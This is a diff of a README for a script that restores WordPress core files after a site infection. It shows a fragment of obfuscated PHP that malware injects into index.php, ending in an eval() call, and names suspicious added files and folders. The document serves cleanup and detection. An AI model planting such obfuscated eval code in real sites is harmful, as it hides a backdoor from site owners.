@@ -30,7 +30,7 @@ define( 'WP_USE_THEMES', true );
 require __DIR__ . '/wp-blog-header.php';
 ```
 
-Some viruses insert extra code in to `index.php`:
+Some viruses insert extra hard-to-read PHP code in to `index.php`:
 ```php
 <?php
  $PxzcQOgNk = function($jWC9KOqRQtX9 ,$MDafuOVYz) {
@@ -41,7 +41,10 @@ return $lKnbe;
 evAL($XG51n);; ?><?php  define('WP_USE_THEMES', true );require(__DIR__.  '/wp-blog-header.php' ); ?>
 ```
 
-They might also create new files (like `admin.php`, which sounds official, but is not part of a normal WP installation), or new folders (like `psp/`, which again in not part of a normal WP installation).
+They might also create new files 
+(like `admin.php`, which sounds official, but is not part of a normal WP installation), 
+or new folders 
+(like `psp/`, which again is not part of a normal WP installation).
 
 What you want to do in this case, is restore all WordPress source code files to their original state.
 This is what this script does.
